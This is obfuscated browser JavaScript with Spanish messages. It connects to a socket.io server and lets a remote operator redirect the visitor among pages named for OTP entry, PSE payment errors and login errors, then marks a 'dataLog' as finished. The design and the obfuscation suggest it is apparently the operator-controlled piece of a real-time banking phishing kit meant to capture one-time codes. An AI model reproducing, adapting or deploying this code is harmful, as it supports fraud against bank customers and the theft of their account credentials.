const _0x45e082 = _0x3e47;
function _0x3e47(_0x221d2a, _0x3e9213) {
  const _0x4b83e0 = _0x4b83();
  return (
    (_0x3e47 = function (_0x3e4752, _0x267a50) {
      _0x3e4752 = _0x3e4752 - 0x12c;
      let _0x3c0b9e = _0x4b83e0[_0x3e4752];
      return _0x3c0b9e;
    }),
    _0x3e47(_0x221d2a, _0x3e9213)
  );
}
(function (_0x2b20b5, _0x2ca895) {
  const _0x4f2628 = _0x3e47,
    _0x296fec = _0x2b20b5();
  while (!![]) {
    try {
      const _0x2ebe81 =
        (-parseInt(_0x4f2628(0x130)) / 0x1) *
          (parseInt(_0x4f2628(0x12e)) / 0x2) +
        (-parseInt(_0x4f2628(0x14b)) / 0x3) *
          (parseInt(_0x4f2628(0x144)) / 0x4) +
        -parseInt(_0x4f2628(0x146)) / 0x5 +
        -parseInt(_0x4f2628(0x13a)) / 0x6 +
        parseInt(_0x4f2628(0x14f)) / 0x7 +
        -parseInt(_0x4f2628(0x14a)) / 0x8 +
        parseInt(_0x4f2628(0x137)) / 0x9;
      if (_0x2ebe81 === _0x2ca895) break;
      else _0x296fec["push"](_0x296fec["shift"]());
    } catch (_0xd574bb) {
      _0x296fec["push"](_0x296fec["shift"]());
    }
  }
})(_0x4b83, 0x9e3e0);
const dataLogId = localStorage["getItem"]("dataLogId"),
  token = localStorage["getItem"](_0x45e082(0x150));
(!dataLogId || !token) &&
  (console[_0x45e082(0x13e)](_0x45e082(0x134)),
  alert(_0x45e082(0x13f)),
  (window[_0x45e082(0x14c)][_0x45e082(0x132)] = _0x45e082(0x14d)));
const socket = io(url, { query: { token: token } });
socket["on"]("connect", () => console[_0x45e082(0x135)](_0x45e082(0x138))),
  socket["on"](_0x45e082(0x13d), (_0x614c1e) =>
    console[_0x45e082(0x13e)](_0x45e082(0x143), _0x614c1e[_0x45e082(0x148)])
  ),
  socket["on"](_0x45e082(0x145), async (_0xa71d67) => {
    const _0x5a0166 = _0x45e082;
    console[_0x5a0166(0x135)](_0x5a0166(0x139), _0xa71d67),
      console[_0x5a0166(0x135)](_0x5a0166(0x140), dataLogId);
    if (String(_0xa71d67["valid"]) !== String(dataLogId)) return;
    const _0x3ad8eb = {
      us: _0x5a0166(0x14e),
      din: _0x5a0166(0x131),
      new_din: "./otp.error.html",
      end: _0x5a0166(0x12f),
    };
    if (_0xa71d67["valor"] in _0x3ad8eb) {
      if (_0xa71d67["valor"] === _0x5a0166(0x136))
        try {
          await updateStatus();
        } catch (_0x4bc1c0) {
          console["error"](_0x5a0166(0x133), _0x4bc1c0),
            alert(_0x5a0166(0x12c));
          return;
        }
      window[_0x5a0166(0x14c)][_0x5a0166(0x132)] =
        _0x3ad8eb[_0xa71d67["valor"]];
    }
  });
function _0x4b83() {
  const _0x238984 = [
    "origin",
    "673292pHiPyG",
    "./errorPse.html",
    "1mBvrHL",
    "./otp.html",
    "href",
    "Error\x20al\x20actualizar\x20el\x20estado:",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "log",
    "end",
    "21299193FjaRWh",
    "Conectado\x20al\x20WebSocket",
    "Datos\x20recibidos:",
    "4259490bFgmgA",
    "Bearer\x20",
    "json",
    "connect_error",
    "error",
    "Hubo\x20un\x20error\x20al\x20cargar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "ID\x20de\x20dataLog:",
    "/dataLogs/updateEndDataLog/",
    "Estado\x20actualizado\x20correctamente\x20en\x20el\x20servidor.",
    "Error\x20de\x20conexión:",
    "8WOeDhc",
    "data",
    "5304125AllHJw",
    "application/json",
    "message",
    "stringify",
    "5049712gIpUOl",
    "41151EENEmf",
    "location",
    "./error.html",
    "./index.error.html",
    "7333319aVPPGl",
    "dataLogToken",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20el\x20estado.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
  ];
  _0x4b83 = function () {
    return _0x238984;
  };
  return _0x4b83();
}
async function updateStatus() {
  const _0x499036 = _0x45e082;
  try {
    const _0x5eaa10 = await fetch(url + _0x499036(0x141) + dataLogId, {
      method: "PUT",
      headers: {
        "Content-Type": _0x499036(0x147),
        Authorization: _0x499036(0x13b) + token,
        Origin: window[_0x499036(0x14c)][_0x499036(0x12d)],
      },
      body: JSON[_0x499036(0x149)]({ status: "Finalizado" }),
    });
    if (!_0x5eaa10["ok"]) {
      const _0x52c777 = await _0x5eaa10[_0x499036(0x13c)]();
      throw new Error(
        _0x52c777[_0x499036(0x13e)] ||
          "Error\x20en\x20el\x20PUT\x20a\x20updateEndDataLog"
      );
    }
    console["log"](_0x499036(0x142));
  } catch (_0x1bee99) {
    throw _0x1bee99;
  }
}
